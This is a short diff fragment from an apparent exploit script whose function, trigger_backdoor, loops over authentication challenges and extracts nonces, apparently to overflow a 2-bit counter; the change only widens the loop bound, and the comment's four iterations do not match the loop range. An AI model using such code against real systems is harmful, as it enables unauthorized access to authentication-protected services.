@@ -22,7 +22,7 @@ def trigger_backdoor(url):
             current_err = initial_err
             
             # The 2-bit counter requires exactly 4 iterations to overflow (1, 2, 3, 0)
-            for attempt in range(1, 16):
+            for attempt in range(1, 17):
                 auth_header = current_err.headers.get("WWW-Authenticate", "")
                 match = re.search(r'nonce="([^"]+)"', auth_header)
                 
